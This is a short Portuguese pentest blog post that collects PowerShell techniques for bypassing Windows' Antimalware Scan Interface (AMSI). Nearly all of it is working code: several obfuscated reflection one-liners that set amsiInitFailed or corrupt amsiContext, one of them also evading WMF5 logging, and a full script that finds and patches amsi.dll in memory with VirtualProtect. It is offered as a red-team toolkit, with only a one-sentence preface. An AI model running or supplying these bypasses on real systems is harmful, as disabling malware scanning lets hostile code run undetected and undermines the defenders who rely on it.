---
title: AMSI Bypass
author: Alan Lacerda
date: 2020-08-30 00:00:00 -0300
categories: [Pentest,Tricks]
tags: [redteam, antivirus, bypass, amsi, powershell]
math: true
---

## AMSI Bypass
Essas referências foram coletadas de alguns lugares mas em sua maioria, elas vieram [deste site](https://amsi.fail/){:target="_blank"} que também pode ser encontrado no post de links úteis. Observe na lista abaixo que variamos entre alguns métodos diferentes, mas pequenas alterações são feitas mesmo quando um método se repete.

### Clássico
```terminal
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

### Matt Graebers second Reflection method 
***
```terminal

[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.'+$([Char](85-20)+[ChAR](8720/80)+[chaR](8+107)+[CHaR](945/9))+'Utils').GetField(''+$([chaR](8+89)+[char](195-86)+[chAR](195-80)+[CHar](74+31))+'Context',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x1F56CC91);
```

### Matt Graebers Reflection method 
***
```terminal
[Ref].Assembly.GetType('System.Management.Automation.'+$([chAr]([ByTE]0x41)+[ChaR](5014/46)+[chAR](51+64)+[char](139-34))+'Utils').GetField(''+$([cHaR](63+34)+[char](60+49)+[CHaR](73+42)+[cHar](735/7))+'InitFailed','NonPublic,Static').SetValue($null,$true);
```
### Matt Graebers Reflection method with WMF5 autologging bypass 
***
```terminal

[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType('System.Management.Automation.'+$([chaR](3+62)+[CHaR](2507/23)+[cHaR](6+109)+[chAr](169-64))+'Utils')),('GetField')).Invoke(''+$([ChAR](1358/14)+[CHaR]([BYTe]0x6D)+[ChAR](4715/41)+[ChAr](4935/47))+'InitFailed',(('NonPublic,Static') -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);
```

```terminal
Write-Host "-- AMSI Patch"
Write-Host "-- Paul Laîné (@am0nsec)"
Write-Host ""

$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Kernel32

Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}

[IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
Write-Host "[+] AMSI DLL Handle: $hModule"

[IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"

If ([IntPtr]::Size -eq 8) {
	Write-Host "[+] 64-bits process"
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,       # mov     r11,rsp
        0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
        0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
        0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
        0x57,                   # push    rdi
        0x41, 0x56,             # push    r14
        0x41, 0x57,             # push    r15
        0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
    )
} Else {
	Write-Host "[+] 32-bits process"
    [byte[]]$egg = [byte[]] (
        0x8B, 0xFF,             # mov     edi,edi
        0x55,                   # push    ebp
        0x8B, 0xEC,             # mov     ebp,esp
        0x83, 0xEC, 0x18,       # sub     esp,18h
        0x53,                   # push    ebx
        0x56                    # push    esi
    )
}
[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)
Write-Host "[+] Targeted address: $targetedAddress"

$oldProtectionBuffer = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null

$patch = [byte[]] (
    0x31, 0xC0,    # xor rax, rax
    0xC3           # ret  
)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

$a = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null
```